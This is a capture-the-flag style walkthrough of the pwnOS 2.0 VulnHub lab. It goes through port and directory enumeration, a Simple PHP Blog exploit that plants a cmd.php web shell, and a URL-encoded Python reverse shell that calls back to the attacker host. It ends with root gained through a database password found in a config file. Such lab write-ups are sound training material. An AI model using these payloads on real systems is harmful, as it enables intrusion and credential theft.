# Machine Link
https://www.vulnhub.com/entry/pwnos-20-pre-release,34/

# Description

Some Important points :

- Due to the machine network configuration this machine cannot be directly accessed in bridge mode until the ip series is 10.10.10.0/24.
- I used another kali virtual machine along with this machine on a NAT network configured to the IP 10.10.10.0/24 network
- If everything is right the machine will have it’s ip 10.10.10.100

# IP
10.10.10.100

---
# Nmap

## Nmap Port Scan :

```bash
nmap -v -p- 10.10.10.100

PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
```

## Nmap Script Scan :

```bash
nmap -v -p- -sC -sV -sT -A -O 10.10.10.100

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 5.8p1 Debian 1ubuntu3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   1024 85:d3:2b:01:09:42:7b:20:4e:30:03:6d:d1:8f:95:ff (DSA)
|   2048 30:7a:31:9a:1b:b8:17:e7:15:df:89:92:0e:cd:58:28 (RSA)
|_  256 10:12:64:4b:7d:ff:6a:87:37:26:38:b1:44:9f:cf:5e (ECDSA)
80/tcp open  http    Apache httpd 2.2.17 ((Ubuntu))
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Welcome to this Site!
|_http-server-header: Apache/2.2.17 (Ubuntu)
```

---
# Community Attack Vectors (To-Try List):

### 80 Apache httpd 2.2.17 →
- Basic recon with nmap
- directory & file bruteforcing
- Checking http OPTIONS (Supported Methods: GET HEAD POST OPTIONS)
- CMS Detection
- Nikto Scan
- searchsploit

### 22 OpenSSH 5.8p1 →
- Basic ssh port scan
- Check banner
- Check for weak ssh algorithms
- Identify running ssh version
- searchsploit OpenSSH 5.8p1

# Web Service Enumeration

### Directory Bruteforcing

```bash
dirsearch -u <http://0.0.0.0> -w /usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt -e '' -o dirsearch_directories.txt

301   241B   <http://0.0.0.0/includes>    -> REDIRECTS TO: <http://0.0.0.0/includes/>
200   723B   <http://0.0.0.0/register>
200   629B   <http://0.0.0.0/login>
301   239B   <http://0.0.0.0/blog>    -> REDIRECTS TO: <http://0.0.0.0/blog/>
200     9KB  <http://0.0.0.0/info>
302    20B   <http://0.0.0.0/activate>    -> REDIRECTS TO: <http://10.10.10.100/index.php>
403   233B   <http://0.0.0.0/server-status>
```

Found a php info page :
<img width="1501" height="1009" alt="image" src="https://github.com/user-attachments/assets/de5978a0-517b-4c4c-8077-d554392d7b71" />

php version : 5.3.5-1ubuntu7

### File Bruteforcing

```bash
dirsearch -u <http://0.0.0.0> -w /usr/share/seclists/Discovery/Web-Content/raft-large-files.txt -e '' -o dirsearch_files.txt

[22:43:44] 200 -  629B  - /login.php
[22:43:44] 200 -  723B  - /register.php
[22:43:45] 200 -    9KB - /info.php
[22:43:45] 403 -  231B  - /.html
[22:43:45] 302 -   20B  - /activate.php  ->  <http://10.10.10.100/index.php>
[22:43:47] 403 -  231B  - /.htm
[22:43:48] 403 -  235B  - /.htpasswds
[22:44:00] 403 -  232B  - /.htuser
[22:44:06] 403 -  231B  - /.htc
[22:44:06] 403 -  230B  - /.ht
[22:44:18] 403 -  232B  - /.htacess
```

Found a blog page :
<img width="1918" height="1048" alt="image" src="https://github.com/user-attachments/assets/cf4c23bf-91fa-4a86-b6e4-132f48b1f532" />

On this page, the technologies and their versions are laid out :
<img width="293" height="230" alt="image" src="https://github.com/user-attachments/assets/7a6129cb-9be1-4aca-b28c-ded50d96416a" />

In the page source we found it is running Simple PHP Blog 0.4.0
<img width="1358" height="699" alt="image" src="https://github.com/user-attachments/assets/df9d4a6c-b463-4c64-9d7c-f9cbd00a65d0" />

Searching on google for Simple PHP blog 0.4.0 expliot :
[Simple PHP Blog 0.4.0 - Multiple Remote s](https://www.exploit-db.com/exploits/1191)

Downlod this exploit and also install a required module :
```bash
apt-get install libswitch-perl
```

Running the exploit on target :
<img width="1208" height="551" alt="image" src="https://github.com/user-attachments/assets/ec5ba7bc-2db5-4e6c-8f8f-6301ff926a88" />

Here on **[http://0.0.0.0/blog/images/cmd.php**](http://0.0.0.0/blog/images/cmd.php**) page is being created for RCE :

<img width="1550" height="942" alt="image" src="https://github.com/user-attachments/assets/beaf438f-6ec5-4774-b7c5-2aabf2c6f210" />

<img width="1212" height="1033" alt="image" src="https://github.com/user-attachments/assets/f87bb8f3-f324-4ee3-be18-ef33813b809a" />

Lets use this to get the reverse shell.

Used python for reverse shell :

```bash
<http://10.10.10.100/blog/images/cmd.php?cmd=python%20-c%20%27import%20socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((%2210.10.10.4%22,443)>);os.dup2(s.fileno(),0);%20os.dup2(s.fileno(),1);%20os.dup2(s.fileno(),2);p=subprocess.call([%22/bin/sh%22,%22-i%22]);%27
```

<img width="1914" height="1053" alt="image" src="https://github.com/user-attachments/assets/a718c588-660f-4453-9a99-bfbb860f5790" />

---
# Privilge Escalation

Once we got the foothold first thing is make the shell stable :

```bash
python -c 'import pty;pty.spawn("/bin/bash")'
```

Now lets look for files contaning passwords.

On /var we found this file :

```bash
cat mysqli_connect.php

	DEFINE ('DB_USER', 'root');
	DEFINE ('DB_PASSWORD', 'root@ISIntS');
	DEFINE ('DB_HOST', 'localhost');
	DEFINE ('DB_NAME', 'ch16');

```

Now use this password to switch to root user :
<img width="1646" height="647" alt="image" src="https://github.com/user-attachments/assets/711d3b8b-865e-407a-a543-4a992753d4aa" />

We go the root shell!!!

*there was not flag.

---
